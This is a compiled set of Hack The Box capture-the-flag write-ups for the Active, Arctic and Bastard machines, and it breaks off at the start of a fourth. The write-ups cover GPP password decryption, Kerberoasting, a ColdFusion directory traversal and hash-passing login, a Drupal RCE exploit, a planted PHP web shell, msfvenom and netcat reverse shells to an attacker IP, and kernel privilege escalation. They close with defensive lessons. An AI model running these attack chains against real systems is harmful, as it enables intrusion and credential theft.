# ----------------------DEBUT------------------------------
active-writeup-w-o-metasploit.md
# Active Writeup w/o Metasploit

![](https://miro.medium.com/max/591/1*cLubOprFexA4alUED5FT8Q.png)

## Reconnaissance <a id="6b46"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA initial 10.10.10.100
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _initial_

We get back the following result showing that 17 ports are open:

* **Port 53:** running DNS 6.1.7601
* **Port 88:** running Kerberos
* **Ports 135, 593, 49152, 49153, 49154, 49155, 49157, 49158:** running msrpc
* **Ports 139 & 445:** running SMB
* **Port 389 & 3268:** running Active Directory LDAP
* **Port 464:** running kpasswd5. This port is used for changing/setting passwords against Active Directory
* **Ports 636 & 3269:** As indicated on the [nmap FAQ page](https://secwiki.org/w/FAQ_tcpwrapped), this means that the port is protected by tcpwrapper, which is a host-based network access control program

![](https://miro.medium.com/max/1062/1*gb-pp91U9HdyUP_xltRr2Q.png)

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p- -oA full 10.10.10.100
```

We get back the following result. We have 6 other ports that are open.

* **Ports 5722:** running Microsoft Distributed File System \(DFS\) Replication service
* **Port 9389:** running .NET Message Framing protocol
* **Port 47001:** running Microsoft HTTPAPI httpd 2.0
* **Ports 49169, 49171, 49182:** running services that weren’t identified by nmap. We’ll poke at these ports more if the other ports don’t pan out.

![](https://miro.medium.com/max/1056/1*-FuG_fTpXLal_7R8FpQUpw.png)

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -p- -oA udp 10.10.10.100
```

I managed to root the box and write this blog, while this UDP scan still did not terminate. So I don’t have UDP scan results for this machine.

## Enumeration <a id="64a0"></a>

The nmap scan discloses the domain name of the machine to be active.htb. So we’ll edit the /etc/hosts file to map the machine’s IP address to the active.htb domain name.

```text
10.10.10.100 active.htb
```

The first thing I’m going to try to enumerate is DNS. Let’s use nslookup to learn more information about this domain.

![](https://miro.medium.com/max/540/1*dcuDgdZeyYb1_SW247ldHw.png)

It doesn’t give us any information. Next, let’s attempt a zone transfer.

```text
host -l active.htb 10.10.10.100
```

No luck there as well. I also tried dnsrecon and didn’t get anything useful.

So we’ll move on to enumerating SMB on ports 139 and 445. We’ll start with viewing the SMB shares.

```text
smbmap -H active.htb
```

* **-H**: IP of host

We get back the following result.

![](https://miro.medium.com/max/832/1*MwTwO_arqZ73VCiJyfiwqA.png)

The Replication share has READ ONLY permission on it. Let’s try to login anonymously to view the files of the Replication share.

```text
smbclient //active.htb/Replication -N
```

* **-N**: suppresses the password since we’re logging in anonymously

We’re in!

![](https://miro.medium.com/max/747/1*8-3B05tshUYBeAeEkz_qfQ.png)

After looking through all the files on this share, I found a Groups.xml file in the following directory.

```text
cd active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
```

![](https://miro.medium.com/max/946/1*bQ5rt9x5C6H3CQNLHpVh6g.png)

A quick google search tells us that Groups.xml file is a Group Policy Preference \(GPP\) file. GPP was introduced with the release of Windows Server 2008 and it allowed for the configuration of domain-joined computers. A dangerous feature of GPP was the ability to save passwords and usernames in the preference files. While the passwords were encrypted with AES, the key was made [publicly available](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN).

Therefore, if you managed to compromise any domain account, you can simply grab the groups.xml file and decrypt the passwords. For more information about this vulnerability, refer to this [site](https://www.mindpointgroup.com/blog/pen-test/privilege-escalation-via-group-policy-preferences-gpp/).

Now that we know how important this file is, let’s download it to our attack machine.

```text
get Groups.xml
```

View the contents of the file.

```text
cat Groups.xml
```

We have a username and encrypted password!

![](https://miro.medium.com/max/900/1*d7WXIVNa1JcAWFOFisVPbQ.png)

This will allow us to gain an initial foothold on the system.

## Gain an Initial Foothold <a id="4e59"></a>

As mentioned above, the password is encrypted with AES, which is a strong encryption algorithm. However, since the key is posted online, we can easily decrypt the encrypted password.

There’s a simple ruby program known as gpp-decrypt that uses the publicly disclosed key to decrypt any given GPP encrypted string. This program is included with the default installation of Kali.

Let’s use it to decrypt the password we found.

```text
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

We get back the plaintext password.

```text
GPPstillStandingStrong2k18
```

From the Groups.xml file, we know that the username is SVG\_TGS. This probably is not the admin user, but regardless let’s try to access the ADMIN$ share with the username/password we found.

```text
smbclient -W active.htb -U SVC_TGS //active.htb/ADMIN$
```

* **-W**: domain
* **-U**: username

Nope, that doesn’t work.

![](https://miro.medium.com/max/852/1*9dTnm8wTa5tL1TQQb31Peg.png)

Let’s try the USERS share.

```text
smbclient -W active.htb -U SVC_TGS //active.htb/USERS
```

We’re in!

![](https://miro.medium.com/max/829/1*JRRcwJ8IAmSCH_e3wiJNIg.png)

Navigate to the directory that contains the user.txt flag.

```text
cd SVC_TGS\Desktop\
```

Download the user.txt file to our attack machine.

```text
get user.txt
```

View the content of the flag.

![](https://miro.medium.com/max/545/1*BDr-4-jD1YXbtKR7B-oTDg.png)

We compromised a low privileged user. Now we need to escalate privileges.

## Privilege Escalation <a id="e04f"></a>

Since we’re working with Active Directory and using Kerberos as an authentication protocol, let’s try a technique known as Kerberoasting. To understand how this attack works, you need to understand how the Kerberos authentication protocol works.

At a high level overview, the [following figure](https://docs.typo3.org/typo3cms/extensions/ig_ldap_sso_auth/stable/SSO/Kerberos.html) describes how the protocol works.

![](https://miro.medium.com/max/506/1*ELyJOU12NmMFVobn6diy6w.png)

If you compromise a user that has a valid kerberos ticket-granting ticket \(TGT\), then you can request one or more ticket-granting service \(TGS\) service tickets for any Service Principal Name \(SPN\) from a domain controller. An example SPN would be the Application Server shown in the above figure.

A portion of the TGS ticket is encrypted with the hash of the service account associated with the SPN. Therefore, you can run an offline brute force attack on the encrypted portion to reveal the service account password. Therefore, if you request an administrator account TGS ticket and the administrator is using a weak password, we’ll be able to crack it!

To do that, download [Impacket](https://github.com/SecureAuthCorp/impacket). This includes a collection of Python classes for working with network protocols.

```text
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket/
python setup.py install #install software
```

They have a script in the /examples folder called GetUserSPNs.py that is used to find SPNs that are associated with a given user account. It will output a set of valid TGSs it requested for those SPNs.

![](https://miro.medium.com/max/904/1*Tv_IrQcTcUMYYHezr6DPdA.png)

Run the script using the SVC\_TGS credentials we found.

```text
./GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
```

* **target:** domain/username:password
* **-dc-ip**: IP address of the domain controller
* **-request**: Requests TGS for users and outputs them in JtR/hashcat format

We get back the following output.

![](https://miro.medium.com/max/1054/1*AUJY2mlHHxNu_KiSxL2Lpw.png)

We were able to request a TGS from an Administrator SPN. If we can crack the TGS, we’ll be able to escalate privileges!

**Note**: If you get a “Kerberos SessionError: KRB\_AP\_ERR\_SKEW\(Clock skew too great\)”, it’s probably because the attack machine date and time are not in sync with the Kerberos server.

Now that we have a valid TGS that is already in John the Ripper format, let’s try to crack it.

```text
john --wordlist=/usr/share/wordlists/rockyou.txt spn-admin.txt
```

We get back the password!

```text
Ticketmaster1968
```

![](https://miro.medium.com/max/961/1*P4pSfo8m5gL2fIZFkK7LZg.png)

To login as the administrator, we’ll use another Impacket script known as psexec.py. As shown in the help menu, you can run the script using the following command.

```text
# psexec.py domain/username:password@targetName
psexec.py active.htb/Administrator:Ticketmaster1968@active.htb
```

![](https://miro.medium.com/max/972/1*LB39WE2e7V24M6a79z10YA.png)

Navigate to the directory that contains the root.txt flag.

```text
cd C:\Users\Administrator\Desktop
```

Download the root.txt file to our attack machine.

```text
get root.txt
```

View the content of the flag.

![](https://miro.medium.com/max/593/1*smiO5bAIiduBLM90y0-VLQ.png)

## Lessons Learned <a id="0523"></a>

I’ll start off by saying that since I have little to no Active Directory and Kerberos experience, Active was one of the toughest machines I worked on! In my opinion, this definitely should not be categorized as an “Easy” machine.

That being said, to gain an initial foothold on the system we first anonymously logged into the Replication share and found a GPP file that contained encrypted credentials. Since the AES key used to encrypt the credentials is publicly available, we were able to get the plaintext password and login as a low-privileged user.

Since this low-privileged user was connected to the domain and had a valid TGT, we used a technique called kerberoasting to escalate privileges. This involved asking the domain controller to give us valid TGS tickets for all the SPNs that are associated with our user account. From there, we got an administrator TGS service ticket that we ran a brute force attack on to obtain the administrator’s credentials.

Therefore, I counted three vulnerabilities that allowed us to get admin level access on this machine.

1. Enabling anonymous login to an SMB share that contained sensitive information. This could have been avoided by disabling anonymous / guest access on SMB shares.
2. The use of vulnerable GPP. In 2014, Microsoft released a security bulletin for [MS14–025](https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati) mentioning that Group Policy Preferences will no longer allow user names and passwords to be saved. However, if you’re using previous versions, this functionality can still be used. Similarly, you might have updated your system but accidentally left sensitive preference files that contain credentials.
3. The use of weak credentials for the administrator account. Even if we did get a valid TGS ticket, we would not have been able to escalate privileges if the administrator had used a long random password that would have taken us an unrealistic amount of computing power and time to crack.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
arctic-writeup-w-o-metasploit.md
# Arctic Writeup w/o Metasploit

![](https://miro.medium.com/max/587/1*aYyca08n6jq5tZOVxjbpJw.png)

## Reconnaissance <a id="d61b"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on these ports.

```text
nmap -sC -sV -O -oA htb/arctic/nmap/initial 10.10.10.11
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _nmap/initial_

We get back the following result showing that three port is open:

* **Ports 135 & 49154:** running Microsoft Windows RPC.
* **Port 8500**: possibly running Flight Message Transfer Protocol \(FMTP\).

![](https://miro.medium.com/max/752/1*HJ3ACdYfVhiGAJ28oRsOww.png)

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p- -oA htb/arctic/nmap/full 10.10.10.11
```

We get back the following result. No other ports are open.

![](https://miro.medium.com/max/748/1*TWbNJze9_OPjyYbRqTbtoA.png)

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -p- -oA htb/arctic/nmap/udp 10.10.10.11
```

We get back the following result.

![](https://miro.medium.com/max/748/1*Hmsv9E8-m2lqpXcW8LN2Mg.png)

## Enumeration <a id="fd90"></a>

Let’s do some more enumeration on port 8500. Visit the URL in the browser.

![](https://miro.medium.com/max/623/1*usijcMIenIWsG5D8EOEneg.png)

It takes about 30 seconds to perform every request! So we’ll try and see if we could perform our enumeration manually before we resort to automated tools.

When you visit the _cfdocs/_ directory, you’ll find an _administrator/_ directory.

![](https://miro.medium.com/max/589/1*z6PpwH4sApbhWYCqYsiPIQ.png)

When you click on the _administrator/_ directory, you’re presented with an admin login page.

![](https://miro.medium.com/max/880/1*-Ym437MPB5fWWHtqgKnmaw.png)

Default/common credentials didn’t work and a password cracker would take an unbelievably long time \(30s per request\), so we’ll have to see if the application itself is vulnerable to any exploits.

The login page does tell us that it’s using Adobe ColdFusion 8, which is a web development application platform. We’ll use the platform name to see if it contains any vulnerabilities.

```text
searchsploit -update # update databasesearchsploit --id adobe coldfusion
```

* _id_: Display the EDB-ID value rather than local path

The application is using version 8, so we only care about exploits relevant to this specific version.

![](https://miro.medium.com/max/942/1*IrbFag7qx0U8KUKDPsTxzg.png)

After reviewing the exploits, two of them stand out:

1. 14641 — Directory Traversal. We’ll use that to get the password of the administrator.
2. 45979 — Arbitrary file Upload. We’ll use that to get a reverse shell on the target machine.

## Gaining an Initial Foothold <a id="33df"></a>

Let’s look at the code for exploit 14641.

![](https://miro.medium.com/max/748/1*Xb3YS3ltDC9_8-wKZT9hUw.png)

We don’t actually have to run the exploit file. Instead, we could just navigate to the above URL to display the content of the password.properties file.

```text
http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

The password is outputted to the screen!

![](https://miro.medium.com/max/572/1*1WRx1zCNkyVb_qfEHcQYiA.png)

The password seems to be hashed, so we can’t simply use it in the password field. We can try to crack it, but first let’s see if there are any other vulnerabilities present in the way the application handles passwords on the client side.

Right click on the page and select _View Page Source_. There, we find three pieces of important information on the steps taken to send the password to the backend.

1. The password is taken from the password field and hashed using SHA1. This is done on the client side.
2. Then the hashed password is HMAC-ed using a salt value taken from the parameter salt field. This is also done on the client side.
3. The HMAC-ed password gets sent to the server with the salt value. There, I’m assuming the server verifies that the hashed password was HMAC-ed with the correct salt value.

```text
<form name="loginform" action="/CFIDE/administrator/enter.cfm" method="POST" onSubmit="cfadminPassword.value = hex_hmac_sha1(salt.value, hex_sha1(cfadminPassword.value));" >
```

The directory traversal vulnerability did not give us the plaintext password but instead gave us an already hashed password.

```text
2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
```

Therefore, instead of cracking the password \(which can take a long time!\) we can calculate the cfadminPassword.value and use an intercepting proxy to bypass the client side calculation.

To quickly calculate the cfadminPassword value use the Console in your browser Developer Tools to run the following JS code.

```text
console.log(hex_hmac_sha1(document.loginform.salt.value, '2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03'));
```

What that does is cryptographically hash the hashed password we found with the salt value. This is equivalent to what the form does when you hit the login button.

Therefore, to conduct the attack use the above JS code to calculate the HMAC of the password.

![](https://miro.medium.com/max/917/1*wHcnkkhMBiwlysrBfQRW0g.png)

Then set the Intercept to On in Burp and on the login page submit any random value in the password field and hit login.

Intercept the request with Burp and change the cfadminPassword field to the value we got in the console and forward the request.

![](https://miro.medium.com/max/927/1*LhNrxpMol0wtcRDz_at7sg.png)

This allows us to login as administrator without knowing the administrator password! This attack can be referred to as passing the hash.

What we essentially did over here is bypass any client side scripts that hash and then HMAC the password and instead, did it by ourselves and sent the request directly to the server. If you had the original plaintext \(not hashed\) password, you wouldn’t have to go through all this trouble.

To make matters even worse, you need to perform the above steps in the short window of 30 seconds! The application seems to reload every 30 seconds and with every reload a new salt value is used. Now, you might ask “why not just get the original salt value and when I intercept the request in Burp, change the salt value to the one I used in the JS code? This way I wouldn’t have to abide by the 30 second rule”. Great question! I had this idea as well, only to find out that the salt value is coming from the server side and seems to also be updated and saved on the server side. So, if you use a previous salt or your own made up salt, the application will reject it!

**Uploading a Reverse Shell**

Now that we successfully exploited the directory traversal vulnerability to gain access to the admin console, let’s try to exploit the arbitrary file upload vulnerability to upload a reverse shell on the server.

The exploit 45979 does not pan out. The directories listed in the exploit do not match the specific version of ColdFusion that is being used here. Arrexel did write an [exploit](https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload) that would work and was written specifically for this box. So it is technically cheating, but I have already spent enough time on this box, so I’m going to use it!

**Note**: The arbitrary file exploit does not require you to authenticate, so technically you don’t need to exploit the directory traversal vulnerability beforehand, unless you plan on using the GUI.

It is worth noting that in the Administrator GUI, there is a Debugging & Logging &gt; Scheduled Tasks category that would allow us to upload files.

![](https://miro.medium.com/max/971/1*HqvdBk09BVtq1448nzEWFA.png)

Instead, I’m going to use arrexal’s exploit.

First, generate a JSP reverse shell that will be run and served by the server.

```text
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.6 LPORT=4444 > shell.jsp
```

Next, run arrexal’s exploit.

```text
python arb-file-exploit.py 10.10.10.11 8500 shell.jsp
```

The exploit tells us where the exploit file was saved.

![](https://miro.medium.com/max/818/1*wcq5Sd42-paHcYnVDMBb9A.png)

Next, start up a listener on the attack machine.

```text
nc -nlvp 4444
```

Then visit the location of the exploit in the browser to run the shell.jsp file.

```text
http://10.10.10.11:8500/userfiles/file/exploit.jsp
```

We have a shell!

![](https://miro.medium.com/max/639/1*yLOirVjgdCbJH-Hkg4kA1A.png)

Grab the user flag.

![](https://miro.medium.com/max/514/1*LCJvXZB-NSDjz-g_AxANog.png)

This is a non-privileged shell, so we’ll have to find a way to escalate privileges.

## Privilege Escalation <a id="48ca"></a>

Let’s find out more about the system.

![](https://miro.medium.com/max/844/1*26r7_9b7OUCDk_v9_uXlxA.png)

It’s running Microsoft Windows 2008 and has not had any updates!

Copy the output of the systeminfo command and save it in a file. We’ll use Windows Exploit Suggester to identify any missing patches that could potentially allow us to escalate privileges.

First update the database.

```text
./windows-exploit-suggester.py --update
```

Then run the exploit suggester.

```text
./windows-exploit-suggester.py --database 2019-10-12-mssb.xls --systeminfo /root/Desktop/htb/arctic/systeminfo.txt
```

![](https://miro.medium.com/max/949/1*jtJeltBsPcvK8wf1ptl8KQ.png)

We have 3 non-Metasploit exploits. I tried MS11–011 but I didn’t get a privileged shell. MS10–059 did work! I found an already compiled executable for it [here](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled).

**Disclaimer**: You really should not use files that you don’t compile yourself, especially if they open up a reverse shell to your machine. Although I’m using this precompiled exploit, I don’t vouch for it.

I’ll transfer the file using arrexal’s exploit by simply changing the req parameter from

```text
...CurrentFolder=/exploit.jsp
```

to

```text
...CurrentFolder=/exploit.exe
```

Run the exploit in the same way and it uploads the exploit to the following directory on the target machine.

```text
cd C:\ColdFusion8\wwwroot\userfiles\file
```

![](https://miro.medium.com/max/581/1*qPCUGbEgK8aqA21u5erKCw.png)

Start up another listener on the attack machine.

```text
nc -nlvp 6666
```

Run the exploit.

```text
exploit.exe 10.10.14.6 6666
```

We have system!

![](https://miro.medium.com/max/635/1*HIOUV1dyIFzvmiuomNT85A.png)

Grab the root flag.

![](https://miro.medium.com/max/482/1*dmzoWaGHptiks_u1v3fRCw.png)

## Lessons Learned <a id="0a4b"></a>

What allowed me to gain initial access to the machine and escalate privileges, is exploiting known vulnerabilities that had patches available. So it goes without saying, you should always update your software!

The second thing worth mentioning is the way the application handled passwords. The password was first hashed using SHA1 and then cryptographically hashed using HMAC with a salt value as the key. All this was done on the client side! What does client side mean? The client has access to all of it \(and can bypass all of it\)! I was able to access the administrator account without knowing the plaintext password.

Hashing passwords is a common approach to storing passwords securely. If an application gets hacked, the attacker should have to go through the trouble of cracking the hashed passwords before getting access to any user credentials. However, if hashing is being done on the client side as apposed to the server side, that would be equivalent to storing passwords in plaintext! As an attacker, I can bypass client side controls and use your hash to authenticate to your account. Therefore, in this case, if I get access to the password file I don’t need to run a password cracker. Instead, I can simply pass the hash.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
bastard-writeup-w-o-metasploit.md
# Bastard Writeup w/o Metasploit

![](https://miro.medium.com/max/591/1*UYJDBW-oK1lJ-vjBuoJqzQ.png)

## Reconnaissance <a id="5095"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.9 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.9Host is likely running Windows---------------------Starting Nmap Quick Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 10:56 EST
Nmap scan report for 10.10.10.9
Host is up (0.043s latency).
Not shown: 997 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
49154/tcp open  unknownNmap done: 1 IP address (1 host up) scanned in 6.84 seconds---------------------Starting Nmap Basic Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 10:56 EST
Nmap scan report for 10.10.10.9
Host is up (0.038s latency).PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.32 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                                                                 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 10:57 EST
Nmap scan report for 10.10.10.9
Host is up.
All 1000 scanned ports on 10.10.10.9 are open|filteredNmap done: 1 IP address (1 host up) scanned in 202.50 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 11:01 EST
Initiating Parallel DNS resolution of 1 host. at 11:01
Completed Parallel DNS resolution of 1 host. at 11:01, 0.02s elapsed
Initiating SYN Stealth Scan at 11:01
Scanning 10.10.10.9 [65535 ports]
....
Nmap scan report for 10.10.10.9
Host is up (0.045s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
49154/tcp open  unknownRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 264.79 seconds
           Raw packets sent: 131270 (5.776MB) | Rcvd: 274 (17.620KB)No new ports---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                 
Running CVE scan on basic ports
                                                                                                                                 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 11:05 EST
Nmap scan report for 10.10.10.9
Host is up (0.038s latency).PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.13 seconds
```

**Note:** The gobuster, nikto and droopescan scans kept timing out. The web server seems to be not able to handle the requests that these tools were sending.

We have three open ports.

* **Port 80:** running Drupal 7
* **Port 135 & 49154:** running Microsoft Windows RPC

Before we move on to enumeration, let’s make some mental notes about the scan results.

* Port 80 is running Drupal 7 which I know from the [Hawk box](https://medium.com/@ranakhalil101/hack-the-box-hawk-writeup-w-o-metasploit-da80d51defcd) is vulnerable to a bunch of exploits. Most of these exploits are associated with the modules that are installed on Drupal. Since droopescan is not working, we’ll have to manually figure out if these modules are installed.

## Enumeration <a id="c516"></a>

Visit the web application in the browser.

![](https://miro.medium.com/max/1088/1*cRNAdfKfV9OsPQuT39EVyQ.png)

It’s running Drupal which is is a free and open-source content management framework. Let’s look at the _CHANGELOG_ to view the exact version.

![](https://miro.medium.com/max/671/1*x0wFdLbdoZjabi7WV4hlTA.png)

It’s running Drupal 7.54.

Let’s try and find credentials to this application. I googled “default credentials drupal”, but I didn’t find anything useful. Next, I tried common credentials _admin/admin_, _admin/password_, etc. but was not able to log in.

When it is an off-the-shelf software, I usually don’t run a brute force attack on it because it probably has a lock out policy in place.

Next, run searchsploit.

```text
searchsploit drupal 7
```

Let’s view vulnerability number 41564.

```text
searchsploit -m 41564
```

It links to this [blog post](https://www.ambionics.io/blog/drupal-services-module-rce). It seems to be a deserialization vulnerability that leads to Remote Code Execution \(RCE\). Looking at the code, it we see that it visit the path _/rest\_endpoint_ to conduct the exploit.

```text
$url = 'http://vmweb.lan/drupal-7.54';
$endpoint_path = '/rest_endpoint';
$endpoint = 'rest_endpoint';
```

That path is not found on the box, however, if we simply change it to _/rest_ it works!

![](https://miro.medium.com/max/695/1*-I6No76lBZgeKwKDQa1wJw.png)

So it is using the _Services_ module. We’ll use this exploit to gain an initial foothold on the box.

## Initial Foothold <a id="03d0"></a>

Make the following changes to the exploit code.

```text
$url = '10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';
```

There are also two comments that are not wrapped properly that you’ll need to fix.

Run the exploit.

```text
php 41564.php 
```

We get an “ Uncaught Error: Call to undefined function curl\_init\(\)” error message. That’s because we don’t have _php-curl_ installed on our kali machine.

```text
apt-get install php-curl
```

Now the exploit should work.

```text
root@kali:~/Desktop/htb/bastard# php 41564.php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics 
# Website: https://www.ambionics.io/blog/drupal-services-module-rce#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: 10.10.10.9/dixuSOspsOUU.php
```

Perfect! It created two files: _session.json_ and _user.json_. View the content of _user.json_.

```text
root@kali:~/Desktop/htb/bastard# cat user.json 
{
    "uid": "1",
    "name": "admin",
    "mail": "drupal@hackthebox.gr",
    "theme": "",
    "created": "1489920428",
    "access": "1581904913",
    "login": 1581908048,
    "status": "1",
    "timezone": "Europe\/Athens",
    "language": "",
    "picture": null,
    "init": "drupal@hackthebox.gr",
    "data": false,
    "roles": {
        "2": "authenticated user",
        "3": "administrator"
    },
    "rdf_mapping": {
        "rdftype": [
            "sioc:UserAccount"
        ],
        "name": {
            "predicates": [
                "foaf:name"
            ]
        },
        "homepage": {
            "predicates": [
                "foaf:page"
            ],
            "type": "rel"
        }
    },
    "pass": "$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE"
```

It gives us the hashed password of the _admin_ user. We could run it through a password cracker, however, we don’t need to because the _session.json_ file gives us a valid session cookie for the _admin_ user.

```text
root@kali:~/Desktop/htb/bastard# cat session.json 
{
    "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
    "session_id": "lxPgeAwtaNwwE9BENklEVeWJf5CLaH5NFe5kEwM6_Is",
    "token": "9EsaYcsIlgp7r31F9qG3HJILwA3cbTzSR-61nEB0r_Y"
}
```

Let’s add the cookie to our browser using the _Cookie Manager_ plugin.

![](https://miro.medium.com/max/733/1*V6AKxYPMdcg0ydwKLk_DLg.png)

Then refresh the page.

![](https://miro.medium.com/max/1421/1*9dkvVuxOYmQuMW9FmCBkhg.png)

We’re logged in as _admin_! Click on the _Modules_ tab and check if the _PHP filter_ is enabled. It is. This means we can add PHP code.

Click on _Add new content_ on the welcome page &gt; click on _Basic page_. In the _Title_ field add the value “_shell_”. In the _Body_ field add the simple PHP shell to upload/execute code from the [following link](https://d47zm3.me/resources/infosec/reverse-shells/). Make sure to include the “_&lt;?php ?&gt;_” tags and change it to the IP address of your attack machine. This gives us the ability to both execute and upload files. In the _Text format_ filed choose the option _PHP code_. Then hit _Save_.

![](https://miro.medium.com/max/1234/1*zuv6awHLBx7lOgmx1ziefw.png)

In my case the entry created is under the path _/node/4_. Let’s test it out.

![](https://miro.medium.com/max/1279/1*DbPTJWah4IJKc_Xj0jzeBw.png)

We have code execution! I can’t seem to use powershell from here, so what we’ll do is upload netcat on the box and then use it to send a reverse shell back to our attack machine.

Run the _systeminfo_ command.

![](https://miro.medium.com/max/1331/1*fEz9TkFIXQ6DsCgx67Lf_Q.png)

It’s a 64-bit operating system. Download the 64-bit executable of netcat from [here](https://eternallybored.org/misc/netcat/). Start up a python server.

```text
python -m SimpleHTTPServer 7777
```

Upload it using the _fupload_ parameter.

![](https://miro.medium.com/max/851/1*ndGVrfi5XLXUpkvyJv02wg.png)

Then set up a listener on the attack machine.

```text
nc -nlvp 1234
```

Use the uploaded netcat executable to send a reverse shell to our attack machine.

![](https://miro.medium.com/max/871/1*txrJaPlUZUXQAEx894ftRQ.png)

We get a shell!

```text
root@kali:~# nc -nlvp 1234
listening on [any] 1234 ...                                                                                                                                             
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.9] 60572                                                                                                               
Microsoft Windows [Version 6.1.7600]                                                                                                                                    
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.                                                                                                         
                                                                                                                                                                        
C:\inetpub\drupal-7.54>whoami                                                                                                                                           
whoami                                                                                                                                                                  
nt authority\iusr
```

Grab the _user.txt_ flag.

![](https://miro.medium.com/max/624/1*KRKVIA-I2J4ZptRdur7iwA.png)

Now we need to escalate privileges.

## Privilege Escalation <a id="580f"></a>

We know from the output of the _systeminfo_ command the OS name and version.

```text
OS Name:                Microsoft Windows Server 2008 R2 Datacenter 
OS Version:             6.1.7600 N/A Build 7600
```

The [Arctic box](https://medium.com/@ranakhalil101/hack-the-box-arctic-writeup-w-o-metasploit-61a43f378c) was running the same OS, so I used the same exploit MS10–059 to escalate privileges for this box. I won’t explain it here, please refer to the the Arctic writeup.

![](https://miro.medium.com/max/641/1*9WVvomboB_Zzk2WZl2FXFQ.png)

Grab the _root.txt_ flag.

![](https://miro.medium.com/max/643/1*jJ1U43aasroVsjEG8V9Xiw.png)

## Lessons Learned <a id="a815"></a>

What allowed me to gain initial access to the machine and escalate privileges, is exploiting known vulnerabilities that had patches available. So it goes without saying, you should always update your software!

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
blue-writeup-w-o-metasploit.md
# Blue Writeup w/o Metasploit

![](https://miro.medium.com/max/580/1*eSNoiP18tknq4quq3BqMbQ.png)

## Reconnaissance <a id="9514"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA initial 10.10.10.40
